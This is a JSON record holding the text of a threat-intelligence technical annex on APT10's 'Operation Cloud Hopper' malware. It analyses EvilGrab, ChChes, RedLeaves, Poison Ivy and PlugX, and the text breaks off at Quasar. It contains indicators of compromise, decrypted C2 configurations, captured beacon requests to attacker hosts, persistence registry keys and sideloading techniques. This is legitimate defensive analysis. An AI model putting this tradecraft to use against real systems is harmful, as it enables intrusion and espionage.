{
    "id": "990007c1-d53c-438c-81d6-20e2548c5d51",
    "created_at": "2023-04-26T02:09:28.398331Z",
    "updated_at": "2025-03-27T02:17:14.501597Z",
    "deleted_at": null,
    "sha1_hash": "730434022203015a57c697880774ef7fbf27ad09",
    "title": "Operation Cloud Hopper: Technical Annex",
    "authors": "",
    "file_creation_date": "2017-04-06T09:39:45Z",
    "file_modification_date": "2021-08-31T13:10:57Z",
    "file_size": 1535334,
    "plain_text": "# Operation Cloud Hopper\n## Technical Annex\n\n\n_Annex B_\n\n_April 2017_\n\n_In collaboration with_\n\n\n-----\n\n### Table of Contents\n\nTable of Contents .......................................................................................................................................... 2\n\nForeword ....................................................................................................................................................... 3\n\nAPT10: Malware ........................................................................................................................................... 4\n\nTactical Malware ....................................................................................................................................... 4\n\nEvilGrab ................................................................................................................................................. 4\n\nChChes .................................................................................................................................................... 5\n\nChChes PowerSploit ............................................................................................................................. 10\n\nRedLeaves ............................................................................................................................................. 13\n\nSustained Malware .................................................................................................................................. 17\n\nPoison Ivy ............................................................................................................................................. 17\n\nPlugX .................................................................................................................................................... 18\n\nQuasar ................................................................................................................................................... 21\n\nAPT10: Scripts and Tools ........................................................................................................................... 24\n\nt.vbs.......................................................................................................................................................... 24\n\nDetect.vbs ................................................................................................................................................ 25\n\nMpsvc.dll ................................................................................................................................................. 25\n\nconsl64.exe .............................................................................................................................................. 26\n\ncsvde.exe .................................................................................................................................................. 26\n\nnbt.exe ..................................................................................................................................................... 26\n\ntcping.exe ................................................................................................................................................ 26\n\npsexe.exe.................................................................................................................................................. 26\n\nNetSess.exe ............................................................................................................................................... 27\n\nrundll32.exe ............................................................................................................................................. 27\n\nsvchost.exe ............................................................................................................................................... 27\n\nCoreImpact Tools ....................................................................................................................................... 28\n\nsecretsdump.exe...................................................................................................................................... 28\n\natexec.exe ................................................................................................................................................ 28\n\npsexec.exe ................................................................................................................................................ 28\n\nRecommendations ...................................................................................................................................... 29\n\n\n-----\n\n### Foreword\n\nThe purpose of this document is to provide technical details of the malware, tools and infrastructure\nused by the China-based threat actor, APT10. This report is a technical Annex provided in addition to\nour main report “Operation Cloud Hopper”, which details research PwC UK and BAE Systems have\nconducted on both this threat actor and two major campaigns we have observed this malware being\nused in.\n\nFrom 2009 to mid-2016, APT10 have used malware that is known to be popular among China-based\nthreat actors. We have categorised the malware used by APT10 into two different types, tactical and\nsustained. Tactical malware is used to gain a foothold on target systems, and sustained malware is\nused to maintain access and act as a backdoor into the network. Since mid-2016 we have seen APT10\ninstigate a retooling of malware, through a combination of internal software development and\nmodification of open source code. Supplementing its malware capability, APT10 have repurposed\nscripts and tools to aid with its operations once access to a victim's network has been established.\n\n**Figure 1: An overview of APT10’s methodology when targeting MSPs**\n\n\n-----\n\n### APT10: Malware\n\n#### Tactical Malware\n\nWe have observed the EvilGrab, ChChes and RedLeaves malware families used as the primary method\nfor initial exploitation to gain entry to the victim. PwC UK categorises these as “tactical” malware\nfamilies. Often deployed via spear phishing, they are lightweight, have particular capabilities and are\ndesigned to facilitate system identification and lateral movement.\n\nThe first of these families, EvilGrab, was likely to have last been used by APT10 in a 2016 spear\nphishing campaign. We have observed ChChes and RedLeaves being used to achieve the same\nobjectives as EvilGrab, and we assess that this activity is almost certainly APT10. The following\nsections detail these families, their functionality and use by the threat actor.\n\n##### EvilGrab\n\nEvilGrab, as per its name, has the capability to “grab” audio, video and screenshots of infected hosts\nand send the captured media to command and control servers. It possesses common reconnaissance\ncapabilities such as attempting to steal application credentials, instant messaging chat logs, keystrokes\nand allows the threat actor remote access to the compromised system.[1]\n\nAPT10 frequently deploys EvilGrab via email, using malicious Microsoft Office documents as part of\nspear phishing campaigns. It attempts to inject into running processes, focussing on security products\nand native Windows processes.\n\nIn previous campaigns, APT10 has used EvilGrab to exploit targets in Japan and the wider South-East\nAsia region. In one instance, the 2016 Taiwanese election was used as a spear phishing theme to\ndeliver the malware. The rest of this section focuses on one observed sample within this wider\ncampaign, and it is almost certain that APT10 have used the same techniques repeatedly.\n\nThe title of the lure was “2016年台灣總統選舉觀戰團 `行程20160105.xls” which translates to “2016`\n```\nTaiwan president election watching group schedule”.[2] Once the spreadsheet is opened, CVE\n```\n2012-0158 is exploited and a file called 6EC5.tmp is dropped in the %TEMP% folder. The file is in fact an\nexecutable binary which, once opened, spawns a ctfmon.exe process and clones itself in the\n```\n%USERPROFILE% directory as a file called IEChecker.exe.\n\n```\nAside from creating IEChecker.exe, the malicious ctfmon.exe process also creates a set of registry\nkeys which contain encoded data. These are in fact modules used by the malware and this behaviour is\nindicative of EvilGrab:\n\n  - `HKCU\\Software\\rar\\e`\n\n  - `HKCU\\Software\\rar\\s`\n\n  - `HKCU\\Software\\rar\\data`\n\n  - `HKCU\\Software\\rar\\ActiveSettings`\n\n  - `HKCU\\Software\\Classes\\VirtualStore\\MACHINE\\Software\\rar\\e`\n\nThe malware establishes persistence by setting an Autorun key called ctfmon.exe to ensure\nIEChecker.exe is executed on startup.\n\n1 [http://blog.trendmicro.com/trendlabs-security-intelligence/evilgrab-malware-family-used-in-targeted-attacks-in-asia/](http://blog.trendmicro.com/trendlabs-security-intelligence/evilgrab-malware-family-used-in-targeted-attacks-in-asia/)\n2 [http://pwc.blogs.com/cyber_security_updates/2016/03/taiwant-election-targetting.html](http://pwc.blogs.com/cyber_security_updates/2016/03/taiwant-election-targetting.html)\n\n\n-----\n\n**Figure 2: An AutoRun key is set by the ctfmon.exe process to ensure IEChecker.exe is executed on**\n**startup.**\n\nThe malware also beacons to the command and control (C2) server 192.225.226[.]98 on port 8080\nby sending TCP SYN packets approximately every 30 seconds.\n\n##### ChChes\n\nChChes, known in PwC UK threat intelligence reporting as Scorpion, is a new malware family that\nsurfaced in late 2016. Analysis shows it to have relatively limited functionality. As with EvilGrab,\nChChes appears to be designed to establish an initial presence and act as a system fingerprinting\nutility.\n\nTo date, we have primarily seen APT10 use ChChes to target Japanese organisations and government\ndepartments. This is based on file naming conventions and the naming of some C2 domains which\nappear to mimic the legitimate domains of specific organisations. For example:\n\n**Malware Filename** **Translation**\n```\n 1102毎日新聞(回答)._exe 1102 Mainich Newspaper (answer)._exe\n 2016県立大学シンポジウムA4＿1025.exe 2016 Prefectural University Symposium\n                       A4_1025.exe\n\n```\n事務連絡案内状(28.11.07).exe `Business contact invitation`\n```\n                       (28.11.07).exe\n\n```\n個人番号の提供について.exe `Regarding provision of Individual`\n```\n                       number.exe\n\n```\n日米拡大抑止協議e `Japan-US expansion deterrence`\n```\n                       conference ( e )\n\n```\nロシア歴史協会の設立と「単一」国史教科書の `Foundation of Russian historical`\n```\n                       association and Composing 「a unity」\n\n```\n作成.exe\n```\n                       state history textbook .exe\n\n```\n安全保障条約変更通知.exe `Notice of Change of Security Guarantee`\n```\n                       Treaty.exe\n\n```\n平成29年日米安保戦略対話提言(未定稿).exe `Japan-U.S. Security Strategy Dialogue`\n```\n                       Recommendation (Undetermined).exe\n11月新学而会.exe November will be the new school.exe\n\n```\n日米関係重要事項一覧表.exe `US-Japan Relations Important List.exe`\n\n**Table 1: An example of Japanese-language filenames used in ChChes campaigns**\n\nOur initial analysis of this malware is based on a file named 安全保障条約変更通知.exe, which\nbroadly translates to “Notice of Change of Security Guarantee Treaty”, with an MD5 hash of\n```\n75500BB4143A052795EC7D2E61AC3261. This file was submitted to VirusTotal by a user in Japan. \n\n```\nOne of the most recognisable features of this malware, is the presence of icons typically associated\nwith the Microsoft Office software suite embedded within the file’s resources. These embedded icons\n\n|Malware Filename|Translation|\n|---|---|\n|1102毎日新聞(回答)._exe|1102 Mainich Newspaper (answer)._exe|\n|2016県立大学シンポジウムA4＿1025.exe|2016 Prefectural University Symposium A4_1025.exe|\n|事務連絡案内状(28.11.07).exe|Business contact invitation (28.11.07).exe|\n|個人番号の提供について.exe|Regarding provision of Individual number.exe|\n|日米拡大抑止協議e|Japan-US expansion deterrence conference ( e )|\n|ロシア歴史協会の設立と「単一」国史教科書の 作成.exe|Foundation of Russian historical association and Composing 「a unity」 state history textbook .exe|\n|安全保障条約変更通知.exe|Notice of Change of Security Guarantee Treaty.exe|\n|平成29年日米安保戦略対話提言(未定稿).exe|Japan-U.S. Security Strategy Dialogue Recommendation (Undetermined).exe|\n|11月新学而会.exe|November will be the new school.exe|\n|日米関係重要事項一覧表.exe|US-Japan Relations Important List.exe|\n\n\n-----\n\nhave been used to obfuscate the executable file type. In this particular sample they are Microsoft Word\nicons, as shown in Figure 3.\n\n**Figure 3: Sample Microsoft Word icons**\n\nThe file uses a code wrapper to hide the actual payload from static analysis tools. In this case, the\nwrapper relies on the VirtualAlloc function to allocate memory buffers required for the payload.\nWhen launched, the application creates a dummy window using a custom window class that installs\nits own routine to handle messages from the Windows message queue.\n\nThe program then starts processing the messages sent to it by the system. The code responsible for\nthis functionality is shown in Figure 4.\n\n**Figure 4: Sample is using a standard Windows application template**\n\nThis code is a “template” for a typical Windows application and is commonly used by legitimate\nprograms. Malware authors use the same template as a way to thwart analysis performed by\nautomated systems. This is also used to hide the malicious code from the analysts looking at the\nsample with a disassembler or a decompiler. The use of a “standard” Windows program template is a\nmore sinister version of wrapping as it impersonates a legitimate application.\n\n\n-----\n\nThe core functionality for decrypting and executing the malicious payload is launched inside the\nwindow procedure installed during the window registration process as shown in Figure 5.\n\n**Figure 5: The call-back procedure is installed during window class registration**\n\nThe handling_procedure is responsible for processing messages sent to the window by the operating\nsystem. These typically include messages informing the window of events affecting the window's state,\nsuch as a user pressing a key, moving or clicking a mouse button or a window being minimised. The\nroutine is called immediately after the window is created and one of the first messages to be processed\nis WM_CREATE - the message sent by the operating system to let the window finalise its initialisation. In\nthis particular case, a procedure, run_payload_4, is called as shown in Figure 6.\n\n**Figure 6: The call-back procedure decrypts and runs the payload**\n\n\n-----\n\nAfter executing, the malware sleeps for 60 seconds and then attempts to communicate with the C2. It\nsends details of the system to the C2, including the system name and version of the OS, as well as any\nstolen credentials. The malware makes adjustments to the user’s proxy settings before beginning C2\nbeaconing.\n\nChChes targets the credentials stored inside Internet Explorer and has the capability to resolve and\nalter the proxy configuration. It achieves this via the function\n```\nWinHttpGetDefaultProxyConfiguration, or by enumerating the configuration files inside the\n%APPDATA%\\Mozilla\\Firefox\\ folder and looking for proxy-related tokens. \n\n```\nThe code is heavily obfuscated, via the use of position-independence alongside other techniques. This\ncode is typically harder to write when compared to programs loaded using a RunPE technique. We\nassess this was likely done to deter security researchers ability to perform static analysis.\n\nThe APIs are resolved dynamically and stored inside a dedicated structure. They are also obfuscated\nas a result of manipulating the relative offsets of the API calls, an example of which is depicted in\nFigure 7.\n\n**Figure 7: A routine obfuscating API calls**\n\nFigure 8 shows the malware attempting to hide the offset to the API table which is resolved during\nrun-time. Implementing this technique has little impact as standard reverse engineering techniques\ncan be used to analyse the code.\n\n**Figure 8: An example showing how the routine is being used**\n\nAnother interesting aspect of this sample is that it uses the printf function to output debugging\nmessages. Since the application is compiled as a GUI program, these messages are not usually visible\nto the end user. As part of our analysis we were able to patch the malware and view the printed debug\nmessages, as seen in Figure 9.\n\n\n-----\n\n**Figure 9: The hidden debug messages can be made visible**\n\nThe debug messages visible in the output show another unusual feature of the malware – the use of\nHEAD requests, broadly equivalent to a HTTP GET request but without the response body. A “Cookie”\nfield is used to communicate the system information and credentials described above. Figure 10 shows\noutput in which the HEAD request is visible.\n\n**Figure 10: Output showing HEAD request**\n\nTwo unique user agents have been observed in samples of the ChChes family:\n\n  - `Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR`\n```\n    1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729;\n    .NET4.0C)\n\n```\n  - `Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/6.0;`\n```\n    SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media\n    Center PC 6.0; .NET4.0C; .NET4.0E)\n\n```\n\n-----\n\nThe ChChes family uses an algorithm to create a mutex at runtime. Using a sequence of instructions, it\nbuilds a buffer with dynamic data combined with hard coded data. It then MD5 hashes the dynamic\ndata, and the resulting hash is converted to its hexadecimal form\n```\n5D0E6AB3A85EDFEA9AA3F2923B4C66F3. The resulting value is used as a base for the mutex name\n\n```\nformed by extracting a sub-string, in this case A85EDFEA9AA3F292.\n\nMany of the samples are digitally signed with a certificate belonging to HackingTeam, a self-described\n“offensive security provider”. This particular certificate has not been valid since mid-2012, and was\nlikely obtained during the HackingTeam breach of 2015.[3]\n\nIf executed, the malware begins by removing itself from the current directory and copying itself to the\nuser’s roaming profile under a different name. An example is given below:\n\n```\nC:\\Users\\<USER>\\AppData\\Roaming\\notron.exe\n\n```\n\nThe new filename varies from sample to sample, likely imitating Norton Antivirus but with a couple of\nletters reversed. It then establishes persistence by adding a key to the user’s startup registry. An\nexample of a corresponding registry entry is shown below:\n```\n HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\ISeC Croot Readr\n\n```\nTo date, the collected ChChes samples communicate to the following C2 domains:\n\n  - `scorpion.poulsenv[.]com`\n\n  - `kawasaki.unhamj[.]com`\n\n  - `kawasaki.cloud-maste[.]com`\n\n  - `zebra.wthelpdesk[.]com`\n\n  - `dick.ccfchrist[.]com`\n\n  - `area.wthelpdesk[.]com`\n\n  - `Trout.belowto[.]com`\n\n##### ChChes PowerSploit\n\nAPT10 has also been observed leveraging PowerSploit,[4] a framework commonly used to inject\nshellcode into other running processes. It has been reported as coming from a ZIP file attached to a\nspear phishing email, as reported by one individual on Twitter in 2017.[5]\n\n3 [https://www.wired.com/2015/07/hacking-team-leak-shows-secretive-zero-day-exploit-sales-work/](https://www.wired.com/2015/07/hacking-team-leak-shows-secretive-zero-day-exploit-sales-work/)\n4 [https://github.com/PowerShellMafia/PowerSploit/blob/master/CodeExecution/Invoke-Shellcode.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/CodeExecution/Invoke-Shellcode.ps1)\n5 [https://twitter.com/Wjenga/status/822282843766128640](https://twitter.com/Wjenga/status/822282843766128640)\n\n\n-----\n\n**Figure 11: Spear phishing email from Twitter**\n\nAccording to another source[6], this email contained a password protected ZIP file called “【Ｈ29科研費\n```\n】繰越申請について.zip”. It is likely to have had the password sent to the victim through an\n\n```\nalternative communication method. The password protection of the ZIP file means that it can bypass\nmany anti-virus email filters, which cannot read the contents of the file without access to the\npassword.\n\nWe analysed one of the files in the zipped attachment which was mentioned in the report, “H29_c```\n26.lnk” (0B6845FBFA54511F21D93EF90F77C8DE). This file contained a shell command which was\n\n```\nencoded in Base64, seen in its decoded form below:\n\n**Figure 12: Decoded shell command**\n\nThe PowerShell script sent a request to get an image file located at “https://goo[.]gl/cpT1NW”, a\nURL which translates to:\n\n6 [http://csirt.ninja/?p=1103](http://csirt.ninja/?p=1103)\n\n\n-----\n\n```\nhttp://koala.acsocietyy[.]com/acc/image/20170112001.jpg\n\n```\nThe images in Figure 13 and Figure 14 represent interaction with the shortened URL contained within\nthe PowerShell script.\n\n**Figure 13: Screenshot of total clicks from Google Analytics data for the shortened URL as at 12**\n**Jan 2017**\n\n**Figure 14: Screenshot of countries and platforms from Google Analytics data for the shortened**\n**URL**\n\nThe downloaded file is not a JPG image as the URL would suggest, but is instead a second PowerShell\nscript that was most likely modified to avoid detection. On execution of the downloaded PowerShell\nscript, a decoy Excel document is created in the user’s \\AppData\\Local\\Temp directory called\n```\nh29c26.xls, which is then opened and displayed to the victim, as seen in Figure 15 below.\n\n```\n\n-----\n\n**Figure 15: Decoy document used by APT10 to target the Japanese education sector**\n\nSimultaneously, the downloaded PowerShell script executes shellcode similar to that from the original\nPowerSploit project and injects ChChes shellcode into PowerShell itself. A HTTP connection is\nestablished with hamiltion.catholicmmb[.]com to retrieve ChChes commands and/or additional\nmodules.\n\n##### RedLeaves\n\nThe latest malware family to be attributed to APT10 is a newly discovered sample, referred to as\nRedLeaves. It was first reported by Lac Watch[7] in late February 2017 and was attributed to APT10 due\nto shared infrastructure with ChChes and also code overlap with PlugX. Further reporting by Japan\nCERT suggests that the RedLeaves code base is based upon the open source tool, “trochilus”.[8] An indepth analysis of RedLeaves was also published by NCC Group.[9]\n\nAnalysis has revealed that RedLeaves is a feature rich malware family with the capability to tunnel and\nreverse proxy traffic, dump browser based credentials and, download and execute files. It is highly\nlikely that RedLeaves is used as an initial payload, packaged and deployed via spear phishing\ntechniques, and then used to further deploy sustained malware such as PlugX, or more recently\nQuasar.\n\n7 [https://www.lac.co.jp/lacwatch/people/20170223_001224.html](https://www.lac.co.jp/lacwatch/people/20170223_001224.html)\n8 [http://blog.jpcert.or.jp/2017/04/redleaves---malware-based-on-open-source-rat.html](http://blog.jpcert.or.jp/2017/04/redleaves---malware-based-on-open-source-rat.html)\n9 https://github.com/nccgroup/Cyber[Defence/blob/master/Technical%20Notes/Red%20Leaves/Red%20Leaves%20technical%20note%20v1.0.pdf](https://github.com/nccgroup/Cyber-Defence/blob/master/Technical%20Notes/Red%20Leaves/Red%20Leaves%20technical%20note%20v1.0.pdf)\n\n\n-----\n\n**Figure 16: Code comparison between RedLeaves and PlugX[10]**\n\nAnalysis of the initial binary shows similar social engineering techniques used by the ChChes\nmalware, with Microsoft Office document icons being an embedded resource to disguise the true\nformat of the binaries.\n\nWe have identified the following three files created by the initial binary; a binary file of unknown\nformat, a malicious Windows Dynamically-Linked Library (DLL) compiled for a 32-bit architecture,\nand a legitimately signed Windows executable used for loading the malicious DLL.\n\nDuring our analysis we identified the following three files created by our sample in the\n```\nC:\\Users\\%USERPROFILE%\\AppData\\Local\\Temp\\ directory:\n\n```\n  - `handkerchief.dat`\n\n  - `obedience.exe`\n\n  - `starburn.dll`\n\n10 [http://blog.jpcert.or.jp/2017/04/redleaves---malware-based-on-open-source-rat.html](http://blog.jpcert.or.jp/2017/04/redleaves---malware-based-on-open-source-rat.html)\n\n\n-----\n\nAnalysis of the first dropped file, handkerchief.dat, suggests it is encrypted given it has an entropy\nof 6.99.\n```\nStarburn.dll exports 238 functions, with the main function loading and decrypting\nhandkerchief.dat. Decryption of handkerchief.dat results in the creation of two binary objects,\n\n```\nthe first a shellcode object and the second a payload. The shellcode is 32-bit, position-independent\ncode responsible for loading the payload. Analysis shows references to API names that are resolved\nduring the shellcode runtime as shown in Figure 17 below.\n\n**Figure 17: API Names resolved during runtime**\n\nOnce executed by the shellcode, the DLL will decrypt a mini-configuration stub embedded within its\nown body. The configuration file is encrypted with a simple XOR key, 0x53. The configuration\ncontains the following data:\n\n**Config Value** **Usage / Description**\n\n`67.205.132.17` First C2 IP Address\n\n`67.205.132.17` Duplicate entry\n\n`144.168.45.116` Second C2 IP Address\n\n`443` C2 port number\n\n`2017-2-22-ALL` Bot group ID\n\n`vv11287GD` Mutex name\n\n`%ProgramFiles%\\Internet` Name of the process which the DLL is to inject\n```\n Explorer\\iexplore.exe \n\n```\n`Lucky123` Part of the key that is used to encrypt/decrypt C2\ncommunications. Another part of the key is defined\nas 0xBFD9CBAE\n\n`C:\\windows\\system32\\RedLeaves.exe` Default name of the executable that will load the\nmalicious DLL, which in turn will load the shellcode\nfrom the encrypted DAT file, which will be injected\ninto Internet Explorer.\n\nThe shellcode takes the full path name of its own\nhost process and patches this configuration field\nwith that file name. As a result, the default contents\nof this field will be replaced with a temporary\nfilename of the dropped legitimate EXE file, such as\n```\n                    %TEMP%\\obedience.exe. The updated name is used\n\n```\nby the bot to re-start itself under a specified user\n\n**Table 2: RedLeaves configuration data**\n\n|Config Value|Usage / Description|\n|---|---|\n|67.205.132.17|First C2 IP Address|\n|67.205.132.17|Duplicate entry|\n|144.168.45.116|Second C2 IP Address|\n|443|C2 port number|\n|2017-2-22-ALL|Bot group ID|\n|vv11287GD|Mutex name|\n|%ProgramFiles%\\Internet Explorer\\iexplore.exe|Name of the process which the DLL is to inject|\n|Lucky123|Part of the key that is used to encrypt/decrypt C2 communications. Another part of the key is defined as 0xBFD9CBAE|\n|C:\\windows\\system32\\RedLeaves.exe|Default name of the executable that will load the malicious DLL, which in turn will load the shellcode from the encrypted DAT file, which will be injected into Internet Explorer. The shellcode takes the full path name of its own host process and patches this configuration field with that file name. As a result, the default contents of this field will be replaced with a temporary filename of the dropped legitimate EXE file, such as %TEMP%\\obedience.exe. The updated name is used by the bot to re-start itself under a specified user|\n\n\n-----\n\nDuring execution RedLeaves was also seen to register two mutexes, both observed during dynamic\nanalysis:\n\n  - `vv11287GD`\n\n  - `RedLeavesCMDSimulatorMutex`\n\nDuring our analysis we identified two mechanisms used by RedLeaves to establish persistence on the\ncompromised system. The first is the addition of a shortcut file named persuasion.lnk placed in a\nStartup folder. If this fails, the malware also attempts to add the following registry keys:\n\n  - `HKEY_CURRENT_USER\\SOFTWARE\\EGGORG`\n\n  - `HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\pedetdata`\n\n  - `HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\{Default}`\n\n  - `HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\pedetdata`\n\n  - `HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\{Default}`\n\nCode analysis shows that two IP addresses are hardcoded into the sample which are known to be\nassociated with APT10 infrastructure, and can be seen in Figure 18. These IP addresses are also\npresent in the previously mentioned configuration file.\n\n**Figure 18: IP Addresses hard coded into RedLeaves**\n\nThe encryption used to communicate with the C2 is based on the RC4 algorithm. The secret key used\nfor encryption is hard coded and equal to 88888888. A possible interpretation for the choice of the key\ncould be reference to Chinese culture where sequences of the number 8 are considered lucky.\nInterestingly, during the runtime the secret key is changed to “Lucky123”, likely confirming our\nearlier interpretation, and also providing a possible clue about attribution.\n\nThe malware initiates polling of the C2 with periodic requests, such as:\n\n```\nPOST /Btrjvkyim/index.php HTTP/1.1\nConnection: Keep-Alive\nAccept: */*\nContent-Length: 136\nHost: 67.205.132.17:443\n2uck.uck....zX.O...>.*&P..r.................2.......?{<..e.F......uh1o..%tH.V+R.m..O1.......\n...H.%..kD...v...!1..n..zV%...R[...i.}...wk\n\n```\n\nApart from the specified port 443, it may also use ports 53, 80, and 995. The remote commands\nreceived from the C2 allow the malware to do the following:\n\n  - Download a file from a specified URL, and save it under a specified filename;\n\n\n-----\n\n  - Connect to a remote server, using a specified IP and port number;\n\n  - Start up a so called \"RedLeavesCMDSimulator\" - a console session that will accept commands\nfrom the memory pipe \\\\.\\pipe\\NamePipe_MoreWindows. The received commands will then\nbe executed with the command line interpreter cmd.exe.;\n\n  - Enumerate all Remote Desktop sessions, and for each session, retrieve information that\nincludes the logged on user name and the status of the session;\n\n  - Run the executable specified in the configuration, using specified user session ID, e.g.:\n```\n     o C:\\windows\\system32\\RedLeaves.exe\n     o %TEMP%\\obedience.exe;\n\n```\n  - Execute remote command with:\n```\n     o cmd.exe /c start;\n\n```\n  - Enumerate/search files;\n\n  - Delete specified files;\n\n  - Enumerate drives; and\n\n  - Retrieve detailed system information that includes:\n\n`o` Hostname;\n`o` OS version number, platform;\n`o` Memory information;\n`o` Network parameters;\n`o` Time elapsed since the system was started;\n`o` User account information: name, group, privilege info; and,\n`o` CPU information.\n\nAs tactical malware, RedLeaves is a versatile tool that would allow APT10 to quickly gain a foothold\nand further exploit the access before the actor deploys more sustained malware like PlugX or Quasar.\n\n#### Sustained Malware\n\nSustained malware is used by APT10 to consolidate their access to a network, and ensure that they are\nable to maintain that access even if stolen credentials are changed. The malware detailed in this\nsection is designed to facilitate long term access to networks. Throughout the time we have been\ntracking APT10, we have seen them progress from Poison Ivy as the sustained malware tool of choice,\nto PlugX and more recently Quasar.\n\n##### Poison Ivy\n\nPoison Ivy is an extendible malware family and was commonly used by APT10 between 2009 and 201.\nPoison Ivy has been widely reported on in the past, most notably by FireEye in their report “Poison\nIvy: Assessing Damage and Extracting Intelligence”.[11]\n\nOne of the latest Poison Ivy binaries known to have been used by APT10, compiled in mid-2014, has\nan MD5 hash of 08A268A4C473F9920B254A6B6FC62548. This instance of Poison Ivy has been\nconfigured with the password: happyyongzi. While not a common password, it is still used by the\nthreat actor and has been previously associated with them. This sample communicated with the C2\nserver last.p6p6[.]net, which is a domain controlled by APT10, and registered using the email\naddress wangtongbao1957@gmail[.]com.\n\nIt also registers a mutex, K!@DKFK#*, and further analysis of the code reveals several references to\n“WindowXarBot”, which is likely to be the name of the malware. Further to this, the actor has not\n\n11 [https://www.fireeye.com/content/dam/fireeye-www/global/en/current-threats/pdfs/rpt-poison-ivy.pdf](https://www.fireeye.com/content/dam/fireeye-www/global/en/current-threats/pdfs/rpt-poison-ivy.pdf)\n\n\n-----\n\nremoved the debug path, D:\\code\\Projects\\WindowXarbot\\Release\\WindowXarbot.pdb again\nreferencing “WindowXarBot”.\n\n**Figure 19: References to the possible internal name for APT10’s Poison Ivy**\n\n##### PlugX\n\nPlugX is a modular malware family with a myriad of functions and capabilities and as a result, it can\nbe easily extended. It is likely that this design has been used to maintain robustness and allow for\nagility in functionality.\n\nWhile Poison Ivy and PlugX do not have a common codebase, recent analysis revealed the addition of\nPoison Ivy functionality to PlugX’s source code.[12] This supports our finding in relation to APT10\nretooling from Poison Ivy to PlugX, standardising and enhancing their approach to malware\ndevelopment.\n\nPlugX binaries almost always come in the same form, as a self-extracting archive, created using\nWinrar and the “Create SFX archive” option. The initial SFX file extracts three binaries to a temporary\nfolder:\n\n1. Legitimate binary (Filetype: Executable);\n2. Malicious DLL used for sideloading (Filetype: Dynamic Link Library); and,\n3. Encrypted configuration file (Filetype: Data).\n\nThe legitimate binary is executed and recognises the DLL as legitimate and attempts to load it. The\nmalicious DLL, also known as the PlugX loader, decrypts and decompresses the configuration file. In\nour example, we show the loading of the encrypted configuration file.\n\n12 [http://blog.jpcert.or.jp/2017/02/plugx-poison-iv-919a.html](http://blog.jpcert.or.jp/2017/02/plugx-poison-iv-919a.html)\n\n\n-----\n\n**Figure 20: Pushing the encrypted configuration file, msseces.asm, into String2**\n\nThe configuration loads the payload into memory, by creating and injecting code into both\n```\nsvchost.exe and msiexec.exe. The header of the msiexec.exe is wiped in memory and replaced by\n\n```\nthe standard PlugX header \"GULP\". The running process, msiexec.exe, can be found as a child\nprocess of svchost.exe. PlugX maintains persistence via the creation of a registry key as well as a\nservice, which checks regularly to confirm if PlugX is still running. The payload will call back to any of\nthe four C2s in the configuration file. The controller will respond with additional plugins or modules\nto load onto the system.\n\nThroughout our investigations and tracking of the threat actor, we have seen the following binaries\nbeing used for sideloading:\n\n**Legitimate binary abused for sideloading** **Belongs to**\n\n`AVK.exe` G-Data Antivirus (G-Data)\n\n`cicmdf.exe` CreateInstall Free installer (CreateInstall)\n\n`ciquick.exe` CreateInstall Quick installer (CreateInstall)\n\n`k7sysmon.exe` K7SysMon Module (K7 Antivirus)\n\n`mfeann.exe` McAfee VSCore Announcer (Intel Security)\n\n`MsMpEng.exe` Windows Defender (Microsoft)\n\n`pokerstarsbr.exe` Rational Embedded Browser Client Software\n(Poker Stars)\n\n`RC.exe` Microsoft Resource Compiler (Microsoft)\n\n`Setup.exe` Microsoft .NET Framework (Microsoft)\n\n`ShortcutFixer.exe` ShortcutFixer (Glary Utilities)\n\n`vba32arkit.exe` VBA32 Anti-Rootkit (VBA32)\n\nShown in Figure 21 are all the example combinations we have observed from APT10.\n\n|Legitimate binary abused for sideloading|Belongs to|\n|---|---|\n|AVK.exe|G-Data Antivirus (G-Data)|\n|cicmdf.exe|CreateInstall Free installer (CreateInstall)|\n|ciquick.exe|CreateInstall Quick installer (CreateInstall)|\n|k7sysmon.exe|K7SysMon Module (K7 Antivirus)|\n|mfeann.exe|McAfee VSCore Announcer (Intel Security)|\n|MsMpEng.exe|Windows Defender (Microsoft)|\n|pokerstarsbr.exe|Rational Embedded Browser Client Software (Poker Stars)|\n|RC.exe|Microsoft Resource Compiler (Microsoft)|\n|Setup.exe|Microsoft .NET Framework (Microsoft)|\n|ShortcutFixer.exe|ShortcutFixer (Glary Utilities)|\n|vba32arkit.exe|VBA32 Anti-Rootkit (VBA32)|\n\n\n-----\n\n**Figure 21: Legitimate binaries used for sideloading PlugX by APT10**\n\nAll of the PlugX versions observed being used by APT10 are Type I, which is the earliest known PlugX\nversion. A breakdown of PlugX historic activity is given in a BlackHat talk titled “Unplugging PlugX”.[13]\n\nThe PlugX we have observed beacons over port 443. An example of this is shown below:\n\n```\nPOST /update?id=0070f858 HTTP/1.1\nAccept: */*\nMJ1X: 0\nMJ2X: 0\nMJ3X: 61456\nMJ4X: 1\nUser-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; SLCC2; .NET CLR\n2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0;\nInfoPath.3)\nHost: nttdata.otzo[.]com:443\nContent-Length: 0\nConnection: Keep-Alive\nCache-Control: no-cache\n\n```\n\n13 [https://www.blackhat.com/docs/asia-14/materials/Haruyama/Asia-14-Haruyama-I-Know-You-Want-Me-Unplugging-](https://www.blackhat.com/docs/asia-14/materials/Haruyama/Asia-14-Haruyama-I-Know-You-Want-Me-Unplugging-PlugX.pdf)\n[PlugX.pdf](https://www.blackhat.com/docs/asia-14/materials/Haruyama/Asia-14-Haruyama-I-Know-You-Want-Me-Unplugging-PlugX.pdf)\n\n\n-----\n\n##### Quasar\n\nIn early 2017, we encountered a new malware family used by APT10, a custom loader for the open\nsource remote access tool “QuasarRAT”. Our analysis of this new malware family suggests that APT10\nhave an in-house software development team to create bespoke tools utilising a custom .NET loader to\ndeliver the malware. While many of the QuasarRAT configuration settings are left at their 